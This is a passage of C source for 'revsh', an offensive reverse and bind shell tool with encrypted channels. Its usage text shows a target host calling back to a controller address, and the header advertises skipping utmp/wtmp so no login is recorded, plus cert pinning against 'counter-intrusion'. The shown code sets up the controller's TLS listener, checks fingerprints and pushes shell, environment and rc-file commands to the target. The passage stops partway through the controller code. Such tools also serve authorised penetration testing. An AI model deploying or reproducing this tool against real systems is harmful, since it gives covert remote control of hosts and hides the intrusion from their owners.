
/***********************************************************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support!
 *	Now with more Perfect Forward Secrecy!!!
 *
 *
 * 2013-07-17: Original release.
 * 2014-08-22: Complete overhaul w/SSL support.
 *
 *
 * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
 * designed to establish a remote shell with terminal support. This isn't intended as a replacement for netcat, but
 * rather as a supplementary tool to ease remote interaction during long engagements.
 *
 *
 * Features:
 *		* Reverse Shell.
 *		* Bind Shell.
 *		* Terminal support.
 *		* Handle window resize events.
 *		* Circumvent utmp / wtmp. (No login recorded.)
 *		* Process rc file commands upon login.
 *		* Anonymous Diffie-Hellman encryption upon request.
 *		* Ephemeral Diffie-Hellman encryption as default.
 *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
 *
 **********************************************************************************************************************/


#include "common.h"
#include "keys/dh_params_2048.c"


/***********************************************************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 **********************************************************************************************************************/
void usage(){
	fprintf(stderr, "\nusage: %s [-c [-a] [-s SHELL] [-d KEYS_DIR] [-f RC_FILE]] [-b [-k]] [-t SEC] [-r SEC1[,SEC2]] [ADDRESS:PORT]\n", \
			program_invocation_short_name);
	fprintf(stderr, "\n\t-c\t\tRun in controller mode.\t\t\t\t(Default is target mode.)\n");
	fprintf(stderr, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
	fprintf(stderr, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
	fprintf(stderr, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s/%s/\".)\n", REVSH_DIR, KEYS_DIR);
	fprintf(stderr, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s/%s\".)\n", REVSH_DIR, RC_FILE);
	fprintf(stderr, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
	fprintf(stderr, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
	fprintf(stderr, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
	fprintf(stderr, "\t-k\t\tStart the bind shell in keep-alive mode.\t(Ignored in reverse shell mode.)\n");
	fprintf(stderr, "\t-h\t\tPrint this help.\n");
	fprintf(stderr, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
	fprintf(stderr, "\n\tNotes:\n");
	fprintf(stderr, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
	fprintf(stderr, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
	fprintf(stderr, "\n\tExample:\n");
	fprintf(stderr, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
	fprintf(stderr, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
	fprintf(stderr, "\n\n");

	exit(-1);
}



/***********************************************************************************************************************
 *
 * dummy_verify_callback()
 *
 * Inputs: The stuff that openssl requires of a verify_callback function. We won't ever use these things, I promise.
 * Outputs: 1. Always 1.
 *
 * Purpose: This dummy function does nothing of interest, but satisfies openssl that a verify_callback function does 
 *	exist. The net effect of a dummy verify_callback function like this is that you can use self signed certs without
 *	any errors. As this tool is for dirty hackers, we won't ever be using a cert that isn't self signed.
 *
 **********************************************************************************************************************/
int dummy_verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {

	// The point of a dummy function is that it's components won't be used. 
	// We will nop reference them however to silence the noise from the compiler.
	preverify_ok += 0;
	ctx += 0;

	return(1);
}


/*******************************************************************************
 * 
 * catch_alarm()
 *
 * Input: The signal being handled. (SIGALRM)
 * Output: None. 
 * 
 * Purpose: To catch SIGALRM and exit quietly.
 * 
 ******************************************************************************/
void catch_alarm(int signal){
  exit(-signal);
}


/***********************************************************************************************************************
 *
 * main()
 *
 * Inputs: The usual argument count followed by the argument vector.
 * Outputs: 0 on success. -1 on error.
 *
 * Purpose: main() runs the show.
 *
 * Notes:
 *	main() can be broken into three sections:
 *		1) Basic initialization.
 *		2) Setup the controller and call the broker().
 *		3) Setup the target and call the broker().
 *
 **********************************************************************************************************************/
int main(int argc, char **argv){

	int i, retval, err_flag;

	int opt;
	char *shell = NULL;
	char *keys_dir = NULL;
	char *env_string = NULL;

	char *pty_name;
	int pty_master, pty_slave;
	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_argv;
	char **exec_envp;
	char **tmp_vector;

	int buff_len, tmp_len;
	char *buff_head = NULL, *buff_tail;
	char *buff_ptr;

	int io_bytes;

	struct winsize tty_winsize;

	char tmp_char;
	unsigned long tmp_ulong;

	struct remote_io_helper io;

	BIO *accept = NULL;

	struct passwd *passwd_entry;

	char *cipher_list = NULL;

#include "keys/target_key.c"
	int target_private_key_len = sizeof(target_private_key);

#include "keys/target_cert.c"
	int target_certificate_len = sizeof(target_certificate);

	char *controller_cert_path_head = NULL, *controller_cert_path_tail = NULL;
	char *controller_key_path_head = NULL, *controller_key_path_tail = NULL;

	const EVP_MD *fingerprint_type = NULL;
	X509 *remote_cert;
	unsigned int remote_fingerprint_len;
	unsigned char remote_fingerprint[EVP_MAX_MD_SIZE];
	X509 *allowed_cert;
	unsigned int allowed_fingerprint_len;
	unsigned char allowed_fingerprint[EVP_MAX_MD_SIZE];

#include "keys/controller_fingerprint.c"
	char *remote_fingerprint_str;

	FILE *target_fingerprint_fp;

	char *allowed_cert_path_head, *allowed_cert_path_tail;

	SSL_CIPHER *current_cipher;

	char *rc_path_head, *rc_path_tail;
	int rc_fd;
	char *rc_file = NULL;

	int bindshell = 0;
	int keepalive = 0;

	int timeout = TIMEOUT;
	struct sigaction act;

	char *retry_string = RETRY;
	unsigned long retry_start, retry_stop, retry;

	struct timespec req;


	/*
	 * Basic initialization.
	 */

	io.controller = 0;
	io.encryption = EDH;

	while((opt = getopt(argc, argv, "pbkacs:d:f:r:ht:")) != -1){
		switch(opt){

			// plaintext
			//
			// The plaintext case is an undocumented "feature" which should be difficult to use.
			// You will need to pass the -p switch from both ends in order for it to work.
			// This is provided for debugging purposes only.
			case 'p':
				io.encryption = PLAINTEXT;
				break;

			// bindshell
			case 'b':
				bindshell = 1;
				break;

			case 'k':
				keepalive = 1;
				break;

			case 'a':
				io.encryption = ADH;
				break;

			case 'c':
				io.controller = 1;
				break;

			case 's':
				shell = optarg;
				break;

			case 'd':
				keys_dir = optarg;
				break;

			case 'f':
				rc_file = optarg;
				break;

			case 'r':
				retry_string = optarg;
				break;

			case 't':
			errno = 0;
			timeout = strtol(optarg, NULL, 10);
			if(errno){
				fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
						program_invocation_short_name, io.controller, optarg, \
						strerror(errno));
				usage();
			}
			break;

			case 'h':
			default:
				usage();
		}
	}

	buff_ptr = strrchr(argv[0], '/');	
	if(!buff_ptr){
		buff_ptr = argv[0];
	}else{
		buff_ptr++;
	}

	if(!strncmp(buff_ptr, "bindsh", 6)){
		bindshell = 1;
	}

	switch(io.encryption){

		case ADH:
			cipher_list = ADH_CIPHER;
			break;

		case EDH:
			cipher_list = CONTROLLER_CIPHER;
			break;
	}

	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
	}

	if((argc - optind) == 1){
		tmp_len = strlen(argv[optind]);
		memcpy(buff_head, argv[optind], tmp_len);
	}else if((argc - optind) == 0){
		tmp_len = strlen(ADDRESS);
		memcpy(buff_head, ADDRESS, tmp_len);
	}else{
		usage();
	}

	SSL_library_init();
	SSL_load_error_strings();

	// Prepare the retry timer values.
	errno = 0;
	retry_start = strtol(retry_string, &buff_ptr, 10);
	if(errno){
		fprintf(stderr, "%s: %d: strtol(%s, %lx, 10): %s\r\n", \
				program_invocation_short_name, io.controller, retry_string, \
				(unsigned long) &buff_ptr, strerror(errno));
		exit(-1);
	}

	if(*buff_ptr != '\0'){
		buff_ptr++;
	}

	errno = 0;
	retry_stop = strtol(buff_ptr, NULL, 10);
	if(errno){
		fprintf(stderr, "%s: %d: strtol(%s, NULL, 10): %s\r\n", \
				program_invocation_short_name, io.controller, \
				buff_ptr, strerror(errno));
		exit(-1);
	}

	// XXX DEBUG:
	RAND_pseudo_bytes((unsigned char *) &tmp_ulong, sizeof(tmp_ulong));
	retry = retry_start + (tmp_ulong % (retry_stop - retry_start));
	printf("DEBUG: retry: %ld\n", retry);

	// The joy of a struct with pointers to functions. We only call "io.remote_read()" and the
	// appropriate crypto / no crypto version is called on the backend.
	if(io.encryption){

		io.remote_read = &remote_read_encrypted;
		io.remote_write = &remote_write_encrypted;

		fingerprint_type = EVP_sha1();

	}else{

		io.remote_read = &remote_read_plaintext;
		io.remote_write = &remote_write_plaintext;

	}


	/*
	 * Controller:
	 * - Open a socket / setup SSL.
	 * - Listen for a connection.
	 * - Send initial shell data.
	 * - Send initial environment data.
	 * - Send initial termios data.
	 * - Set local terminal to raw. 
	 * - Send the commands in the rc file.
	 * - Enter broker() for data brokering.
	 * - Reset local term.
	 * - Exit.
	 */
	if(io.controller){

		// - Open a socket / setup SSL.
		if(io.encryption == EDH){
			if((controller_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
						strerror(errno));
				exit(-1);
			}

			if(!keys_dir){
				memcpy(controller_cert_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

				controller_cert_path_tail = index(controller_cert_path_head, '\0');
				*(controller_cert_path_tail++) = '/';
				sprintf(controller_cert_path_tail, REVSH_DIR);
				controller_cert_path_tail = index(controller_cert_path_head, '\0');
				*(controller_cert_path_tail++) = '/';
				sprintf(controller_cert_path_tail, KEYS_DIR);
			}else{
				memcpy(controller_cert_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
			}
			controller_cert_path_tail = index(controller_cert_path_head, '\0');
			*(controller_cert_path_tail++) = '/';
			sprintf(controller_cert_path_tail, CONTROLLER_CERT_FILE);


			if((controller_cert_path_head - controller_cert_path_tail) > PATH_MAX){
				fprintf(stderr, "%s: %d: controller cert file: path too long!\n",
						program_invocation_short_name, io.controller);
				exit(-1);
			}

			if((controller_key_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
				fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
						program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
						strerror(errno));
				exit(-1);
			}

			if(!keys_dir){
				memcpy(controller_key_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

				controller_key_path_tail = index(controller_key_path_head, '\0');
				*(controller_key_path_tail++) = '/';
				sprintf(controller_key_path_tail, REVSH_DIR);
				controller_key_path_tail = index(controller_key_path_head, '\0');
				*(controller_key_path_tail++) = '/';
				sprintf(controller_key_path_tail, KEYS_DIR);
			}else{
				memcpy(controller_key_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
			}
			controller_key_path_tail = index(controller_key_path_head, '\0');
			*(controller_key_path_tail++) = '/';
			sprintf(controller_key_path_tail, CONTROLLER_KEY_FILE);


			if((controller_key_path_head - controller_key_path_tail) > PATH_MAX){
				fprintf(stderr, "%s: %d: controller key file: path too long!\n",
						program_invocation_short_name, io.controller);
				exit(-1);
			}
		}


		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
						program_invocation_short_name, io.controller, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if((io.dh = get_dh2048()) == NULL){
				fprintf(stderr, "%s: %d: get_dh2048(): %s\n", \
						program_invocation_short_name, io.controller, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(!SSL_CTX_set_tmp_dh(io.ctx, io.dh)){
				fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, cipher_list) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, cipher_list, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(io.encryption == EDH){
				SSL_CTX_set_verify(io.ctx, SSL_VERIFY_PEER | SSL_VERIFY_FAIL_IF_NO_PEER_CERT, dummy_verify_callback);

				if((retval = SSL_CTX_use_certificate_file(io.ctx, controller_cert_path_head, SSL_FILETYPE_PEM)) != 1){
					fprintf(stderr, "%s: %d: SSL_CTX_use_certificate_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) io.ctx, controller_cert_path_head, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				free(controller_cert_path_head);

				if((retval = SSL_CTX_use_PrivateKey_file(io.ctx, controller_key_path_head, SSL_FILETYPE_PEM)) != 1){
					fprintf(stderr, "%s: %d: SSL_CTX_use_PrivateKey_file(%lx, %s, SSL_FILETYPE_PEM): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) io.ctx, controller_key_path_head, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				free(controller_key_path_head);

				if((retval = SSL_CTX_check_private_key(io.ctx)) != 1){
					fprintf(stderr, "%s: %d: SSL_CTX_check_private_key(%lx): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}
			}
		}

		act.sa_handler = catch_alarm;

		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
					program_invocation_short_name, io.controller, \
					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
			exit(-1);
		}

		alarm(timeout);

		if(bindshell){

			// - Open a network connection back to the target.
			if((io.connect = BIO_new_connect(buff_head)) == NULL){
				fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
						program_invocation_short_name, io.controller, buff_head, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			printf("Connecting to %s...", buff_head);
			fflush(stdout);

			while(((retval = BIO_do_connect(io.connect)) != 1) && retry_start){

				// Using RAND_pseudo_bytes() instead of RAND_bytes() because this is a best effort. We don't
				// actually want to die or print an error if there is a lack of entropy.
				if(retry_stop){
					RAND_pseudo_bytes((unsigned char *) &tmp_ulong, sizeof(tmp_ulong));
					retry = retry_start + (tmp_ulong % (retry_stop - retry_start));
				}else{
					retry = retry_start;
				}

				printf("No connection.\nRetrying in %ld seconds...\n", retry);
				req.tv_sec = retry;
				nanosleep(&req, NULL);
				printf("Connecting to %s...", buff_head);
				fflush(stdout);
			}

			if(retval != 1){
				fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.connect, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

		}else{
			// - Listen for a connection.
			printf("Listening on %s...", buff_head);
			fflush(stdout);

			if((accept = BIO_new_accept(buff_head)) == NULL){
				fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
						program_invocation_short_name, io.controller, buff_head, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
				fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(BIO_do_accept(accept) <= 0){
				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(BIO_do_accept(accept) <= 0){
				fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if((io.connect = BIO_pop(accept)) == NULL){
				fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) accept, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			BIO_free(accept);
		}

		act.sa_handler = SIG_DFL;

		if((retval = sigaction(SIGALRM, &act, NULL)) == -1){
			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
					program_invocation_short_name, io.controller, \
					SIGALRM, (unsigned long) &act, NULL, strerror(errno));
			exit(-1);
		}

		alarm(0);

		printf("\tConnected!\n");

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
					program_invocation_short_name, io.controller, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(io.encryption){
			if(!(io.ssl = SSL_new(io.ctx))){
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1); 
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if(SSL_accept(io.ssl) < 1){
				fprintf(stderr, "%s: %d: SSL_accept(%lx): %s\n", \
						program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(io.encryption == EDH){
				if((allowed_cert_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
					fprintf(stderr, "%s: %d: calloc(%d, %d): %s\r\n", \
							program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
							strerror(errno));
					exit(-1);
				}

				if(!keys_dir){
					memcpy(allowed_cert_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

					allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
					*(allowed_cert_path_tail++) = '/';
					sprintf(allowed_cert_path_tail, REVSH_DIR);
					allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
					*(allowed_cert_path_tail++) = '/';
					sprintf(allowed_cert_path_tail, KEYS_DIR);
				}else{
					memcpy(allowed_cert_path_head, keys_dir, strnlen(keys_dir, PATH_MAX));
				}
				allowed_cert_path_tail = index(allowed_cert_path_head, '\0');
				*(allowed_cert_path_tail++) = '/';
				sprintf(allowed_cert_path_tail, TARGET_CERT_FILE);


				if((allowed_cert_path_head - allowed_cert_path_tail) > PATH_MAX){
					fprintf(stderr, "%s: %d: target fingerprint file: path too long!\n",
							program_invocation_short_name, io.controller);
					exit(-1);
				}

				if((target_fingerprint_fp = fopen(allowed_cert_path_head, "r")) == NULL){
					fprintf(stderr, "%s: %d: fopen(%s, 'r'): %s\n",
							program_invocation_short_name, io.controller, allowed_cert_path_head, strerror(errno));
					exit(-1);
				}

				free(allowed_cert_path_head);

				if((allowed_cert = PEM_read_X509(target_fingerprint_fp, NULL, NULL, NULL)) == NULL){
					fprintf(stderr, "%s: %d: PEM_read_X509(%lx, NULL, NULL, NULL): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) target_fingerprint_fp, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				if(fclose(target_fingerprint_fp)){
					fprintf(stderr, "%s: %d: fclose(%lx): %s\n",
							program_invocation_short_name, io.controller, (unsigned long) target_fingerprint_fp, strerror(errno));
					exit(-1);
				}

				if(!X509_digest(allowed_cert, fingerprint_type, allowed_fingerprint, &allowed_fingerprint_len)){
					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
							program_invocation_short_name, io.controller, \
							(unsigned long) allowed_cert, \
							(unsigned long) fingerprint_type, \
							(unsigned long) allowed_fingerprint, \
							(unsigned long) &allowed_fingerprint_len, \
							strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				if((remote_cert = SSL_get_peer_certificate(io.ssl)) == NULL){
					fprintf(stderr, "%s: %d: SSL_get_peer_certificate(%lx): %s\n", \
							program_invocation_short_name, io.controller, (unsigned long) io.ssl, strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				printf(" Remote fingerprint expected: ");
				for(i = 0; i < (int) allowed_fingerprint_len; i++){
					printf("%02x", allowed_fingerprint[i]);
				}
				printf("\n");

				if(!X509_digest(remote_cert, fingerprint_type, remote_fingerprint, &remote_fingerprint_len)){
					fprintf(stderr, "%s: %d: X509_digest(%lx, %lx, %lx, %lx): %s\n", \
							program_invocation_short_name, io.controller, \
							(unsigned long) remote_cert, \
							(unsigned long) fingerprint_type, \
							(unsigned long) remote_fingerprint, \
							(unsigned long) &remote_fingerprint_len, \
							strerror(errno));
					ERR_print_errors_fp(stderr);
					exit(-1);
				}

				printf(" Remote fingerprint recieved: ");
				for(i = 0; i < (int) remote_fingerprint_len; i++){
					printf("%02x", remote_fingerprint[i]);
				}
				printf("\n");

				if(allowed_fingerprint_len != remote_fingerprint_len){
					fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
							program_invocation_short_name, io.controller);
					exit(-1);
				}

				for(i = 0; i < (int) allowed_fingerprint_len; i++){
					if(allowed_fingerprint[i] != remote_fingerprint[i]){
						fprintf(stderr, "%s: %d: Fingerprint mistmatch. Possible mitm. Aborting!\n", \
								program_invocation_short_name, io.controller);
						exit(-1);
					}
				}
			}
		}

		printf("Initializing...");

		// - Send initial shell data.
		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;
		if(shell){
			tmp_len = strlen(shell);
			memcpy(buff_tail, shell, tmp_len);
		}else{
			tmp_len = strlen(DEFAULT_SHELL);
			memcpy(buff_tail, DEFAULT_SHELL, tmp_len);
		}
		buff_tail += tmp_len;

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io.controller);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}

		// - Send initial environment data.
		tmp_len = strlen(DEFAULT_ENV);
		if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
					program_invocation_short_name, io.controller, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}

		memcpy(env_string, DEFAULT_ENV, tmp_len);

		if((exec_envp = string_to_vector(env_string)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\n", \
					program_invocation_short_name, io.controller, \
					env_string, strerror(errno));
			exit(-1);
		}

		free(env_string);

		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		for(i = 0; exec_envp[i]; i++){

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\n", \
						program_invocation_short_name, io.controller);
				exit(-1);
			}else if(buff_tail != (buff_head + 1)){
				*(buff_tail++) = ' ';
			}

			tmp_len = strlen(exec_envp[i]);
			memcpy(buff_tail, exec_envp[i], tmp_len);

			buff_tail += tmp_len;

			*(buff_tail++) = '=';

			if((buff_ptr = getenv(exec_envp[i])) == NULL){
				fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
						program_invocation_short_name, exec_envp[i]);
			}else{
				tmp_len = strlen(buff_ptr);
				memcpy(buff_tail, buff_ptr, tmp_len);
				buff_tail += tmp_len;
			}
		}

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", \
					program_invocation_short_name, io.controller);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}


		// - Send initial termios data.
		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
						tty_winsize.ws_row, tty_winsize.ws_col)) < 0){
			print_error(&io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
					program_invocation_short_name, io.controller, \
					tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
			exit(-1);
		}

		buff_tail += retval;
		*(buff_tail++) = (char) ST;

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != tmp_len){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
			exit(-1);
		}

		// - Set local terminal to raw. 
		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &saved_termios_attrs, strerror(errno));
			exit(-1);
		}

		memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
		new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
		new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
		new_termios_attrs.c_cflag |= CS8;
		new_termios_attrs.c_oflag &= ~(OPOST);

		new_termios_attrs.c_cc[VMIN] = 1;
		new_termios_attrs.c_cc[VTIME] = 0;

		if((retval = tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
					program_invocation_short_name, io.controller, \
					(unsigned long) &new_termios_attrs, strerror(errno));
			exit(-1);
		}	

		printf("\tDone!\r\n\n");

		io.local_fd = STDIN_FILENO;

		// - Send the commands in the rc file.
		if((rc_path_head = (char *) calloc(PATH_MAX, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io.controller, PATH_MAX, (int) sizeof(char), \
					strerror(errno));
			exit(-1);
		}

		if(rc_file){
			memcpy(rc_path_head, rc_file, strlen(rc_file));
		}else{
			memcpy(rc_path_head, getenv("HOME"), strnlen(getenv("HOME"), PATH_MAX));

			rc_path_tail = index(rc_path_head, '\0');
			*(rc_path_tail++) = '/';
			sprintf(rc_path_tail, REVSH_DIR);
			rc_path_tail = index(rc_path_head, '\0');
			*(rc_path_tail++) = '/';
			sprintf(rc_path_tail, RC_FILE);

			if((rc_path_head - rc_path_tail) > PATH_MAX){
				print_error(&io, "%s: %d: rc file: path too long!\n",
						program_invocation_short_name, io.controller);
				exit(-1);
			}
		}

		if((rc_fd = open(rc_path_head, O_RDONLY)) != -1){

			buff_tail = buff_head;
			buff_ptr = buff_head;

			while((io_bytes = read(rc_fd, buff_head, buff_len))){
				if(io_bytes == -1){
					print_error(&io, "%s: %d: broker(): read(%d, %lx, %d): %s\r\n", \
							program_invocation_short_name, io.controller, \
							rc_fd, (unsigned long) buff_head, buff_len, strerror(errno));
					exit(-1);
				}
				buff_tail = buff_head + io_bytes;

				while(buff_ptr != buff_tail){
					if((retval = io.remote_write(&io, buff_ptr, (buff_tail - buff_ptr))) == -1){
						print_error(&io, "%s: %d: broker(): io.remote_write(%lx, %lx, %d): %s\r\n", \
								program_invocation_short_name, io.controller, \
								(unsigned long) &io, (unsigned long) buff_ptr, (buff_tail - buff_ptr), strerror(errno));
						exit(-1);
